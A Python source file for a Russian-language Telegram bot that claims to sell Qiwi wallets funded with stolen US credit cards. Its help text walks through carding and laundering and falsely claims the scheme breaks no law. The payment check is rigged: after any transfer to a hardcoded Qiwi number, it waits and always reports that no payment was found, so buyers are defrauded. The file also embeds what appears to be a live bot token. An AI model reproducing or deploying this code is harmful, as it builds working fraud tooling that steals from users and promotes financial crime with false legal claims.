from telebot import types
import time
import telebot
bot = telebot.TeleBot("1020533358:AAFs-IyzgQMfwb9-truQZdE-Q4LaM_L6Jg0")

def glm():
    key = types.InlineKeyboardMarkup()
    key.row(types.InlineKeyboardButton('✅Откуда аккаунты✅', callback_data='otk'))
    key.row(types.InlineKeyboardButton('🥝Выбрать Кошелек🥝', callback_data='vyb'))
    key.row(types.InlineKeyboardButton('🆘Поддержка🆘', callback_data='podder'))
    return key

def nazad ():
    key = types.InlineKeyboardMarkup()
    key.add(types.InlineKeyboardButton('↩️Вернуться в главное меню', callback_data='glm'))
    return key

def koshelki():
    key = types.InlineKeyboardMarkup()
    key.row(types.InlineKeyboardButton('Баланс: 897 ₽ 🛴🛴🛴 Цена: 150 ₽ ', callback_data='kosh1'))
    key.row(types.InlineKeyboardButton('Баланс: 2 899 ₽ 🚲🚲🚲 Цена: 280 ₽ ', callback_data='kosh2'))
    key.row(types.InlineKeyboardButton('Баланс: 7 261 ₽ 🛵🛵🛵 Цена: 840 ₽ ', callback_data='kosh3'))
    key.row(types.InlineKeyboardButton('Баланс: 14 583 ₽ 🏍🏍🏍 Цена: 2 520 ₽ ', callback_data='kosh4'))
    key.row(types.InlineKeyboardButton('Баланс: 29 101 ₽ 🚀🚀🚀 Цена: 7 560 ₽ ', callback_data='kosh5'))
    key.row(types.InlineKeyboardButton('↩️Вернуться в главное меню', callback_data='glm'))
    return key

def qiwi():
    key = types.InlineKeyboardMarkup()
    key.row(types.InlineKeyboardButton('🥝Оплатить через Qiwi🥝', callback_data='qiwi'))
    key.row(types.InlineKeyboardButton('↩️Вернуться в главное меню', callback_data='glm'))
    return key

def oplat ():
    key = types.InlineKeyboardMarkup()
    key.row(types.InlineKeyboardButton('Оплатил', callback_data='oplatil'))
    key.row(types.InlineKeyboardButton('↩️Вернуться в главное меню', callback_data='glm'))
    return key

def check ():
    key = types.InlineKeyboardMarkup()
    key.row(types.InlineKeyboardButton('Проверить оплату', callback_data='check'))
    key.row(types.InlineKeyboardButton('↩️Вернуться в главное меню', callback_data='glm'))
    return key


@bot.message_handler(commands=["start"])
def inline(message):
	bot.send_message(message.chat.id, "Добро пожаловать в наш магазин🧡\n\n➖➖➖➖➖➖➖➖➖➖\nИспользуйте кнопки меню для навигации⬇️",
	 reply_markup=glm())

x=0

@bot.callback_query_handler(func=lambda c:True)
def inlin(c):
    global x
    if c.data=='otk':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Очень долго я и мой подельник искали способ монетизировать кредитные карты, которые он покупал в даркнете у людей с форумов. Мы пробовали покупать товары, но счета сразу же замораживались. Пытались работать с людьми знающими, но натыкались только на развод. "
            "\nСпустя несколько месяцев раздумий, проб и ошибок у меня все-таки получилось найти способ вытащить деньги с карт американцев полностью анонимно — решением оказались ваучеры киви, которые ты активируешь, и на кошелек поступает сумма равная сумме ваучера."
			"\nВывести эти деньги все и сразу у нас не получается, банк начинает звонить и задавать вопросы по типу 'откуда у вас 80 тысяч на карте с разных счетов? У вас есть незарегестрированный в налоговой бизнес?'. Пообщавшись с моим коллегой мы решили, что лучшим решением будет продавать эти кошельки другим людям, чтобы раскидать эти деньги по разным точкам России и СНГ более равномерно, а также обойти вопросы банка. "
			"\nЯ создал этого бота с автоматизированной выдачей кошельков из базы данных, которую заполняет мой коллега. Надеюсь, что в этих словах вы найдете ответ на постоянные вопросы 'Как можно продавать деньги за деньги?',  'А что же вы сами тогда не выводите?' и т.п."
			"\n======================================"
			"\nПринцип работы моего бота таков. После выбора кошелька и его оплаты, вы вписываете номер счета с которого оплачивали, бот сверяет, и если всё верно, то выдает вам номер киви кошелька и пароль. Как только вы вводите данные для входа в кошелек в приложение, и оно запрашивает смс-код, бот тут же высылает вам проверочный код(все кошельки привязаны на виртуальные номера, арендованные на месяц, доступ к которым есть у бота). Как только вы вошли в кошелек и проверили баланс, можете выходить и заходить снова, бот будет выдавать коды в течение месяца с добавления кошелька(следите за обновлениями в группе с отзывами). Для того чтобы вывести деньги вам также потребуется код, который вам выдаст наш бот. ВНИМАНИЕ! ЗАПОМНИТЕ! СМС ПОДТВЕРЖДЕНИЯ НА КИВИ КОШЕЛЬКАХ НЕ ОТКЛЮЧАЮТСЯ!!! Те, кто вам такое говорит, промышляют обманом."
			"\n======================================"
			"\nТеперь ответы на частозадаваемые вопросы:"
			"\n- Деньги можно вывести куда угодно, будь то карта/ваш киви кошелек/любой другой электронный кошелек, также можно оплатить какой-либо товар из интернета;"
			"\n- Больше одного кошелька в день бот вам не выдаст, это сделано для нашей и вашей безопасности, поэтому если вы попытаетесь купить второй кошелек, то бот просто оформит возврат средств на ваш счет;"
			"\n- Такой отмыв денег не нарушает ни одного закона Российской Федерации и близ расположенных стран, т.к. по сути все что мы делаем это выкачиваем деньги из гос. бюджета Америки в Россию. Владельцы карт всегда получают возврат средств по страховке в размере 90%, потому мы крадем у их страховой, а не у них. Иными словами, нет ни малейшего повода для волнения, спим спокойно :)"
			"\n======================================"
			"\nТелеграм канал со всей информацией по поводу бота teleg.run/joinchat/AAAAAEajQiSplkpZm855cA"
			"\nСвязь со мной @voprosisuda"
			"\nПосле покупки кошелька вы можете написать отзыв мне в личку и получить скидку до 40% на следующий кошелек!",
            parse_mode="markdown",
            reply_markup=nazad ())
    elif c.data=='glm':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Добро пожаловать в наш магазин🧡\n\n➖➖➖➖➖➖➖➖➖➖\nИспользуйте кнопки меню для навигации⬇️",
            parse_mode="markdown",
            reply_markup=glm ())
    elif c.data=='vyb':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Выберите кошелек⏬⏬⏬",
            parse_mode="markdown",
            reply_markup=koshelki ())
    elif c.data=='podder':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Поддержка-----> @voprosisuda",
            parse_mode="markdown",
            reply_markup=nazad ())
    elif c.data=='kosh1':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="К оплате 150 ₽ \n➖➖➖➖➖➖➖➖➖➖\n Выберите способо оплаты (Способы оплаты в будущем будут пополняться):",
            parse_mode="markdown",
            reply_markup=qiwi ())
        x="150 ₽"
    elif c.data=='kosh2':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="К оплате 280 ₽ \n➖➖➖➖➖➖➖➖➖➖\n Выберите способо оплаты (Способы оплаты в будущем будут пополняться):",
            parse_mode="markdown",
            reply_markup=qiwi ())
        x="280 ₽"
    elif c.data=='kosh3':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="К оплате 840 ₽ \n➖➖➖➖➖➖➖➖➖➖\n Выберите способо оплаты (Способы оплаты в будущем будут пополняться):",
            parse_mode="markdown",
            reply_markup=qiwi ())
        x="840 ₽"
    elif c.data=='kosh4':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="К оплате 2 520 ₽ \n➖➖➖➖➖➖➖➖➖➖\n Выберите способо оплаты (Способы оплаты в будущем будут пополняться):",
            parse_mode="markdown",
            reply_markup=qiwi ())
        x="2 520 ₽"
    elif c.data=='kosh5':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="К оплате 7 560 ₽ \n➖➖➖➖➖➖➖➖➖➖\n Выберите способо оплаты (Способы оплаты в будущем будут пополняться):",
            parse_mode="markdown",
            reply_markup=qiwi ())
        x="7 560 ₽"
    elif c.data=='qiwi':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text=f'Переведите на Qiwi кошелек {x}\nQiwi кошелек для перевода: ➡️79509761070⬅️ \n➖➖➖➖➖➖➖\nНажмите кнопку оплатил и следуйте дальнейшей инструкции',
            parse_mode="markdown",
            reply_markup=oplat ())
    elif c.data=='oplatil':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text=f'Для проверки платежа:\n\n'
            '1) Введите номер Qiwi кошелька, с которого Вы произвели оплату, затем нажмите "Проверить оплату"',
            parse_mode="markdown",
            reply_markup=check ())    
    elif c.data=='check':
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Проводится проверка платежа, примерное время ожидания 1-5мин",
            parse_mode="markdown")
        time.sleep(90)
        bot.edit_message_text(
            chat_id=c.message.chat.id,
            message_id=c.message.message_id,
            text="Платеж не был найден, повторите проверку спястя какое-то время, возможно проблема со стороны Qiwi",
            parse_mode="markdown",
            reply_markup=check())
    



if __name__ == "__main__":
    bot.polling(none_stop=True)
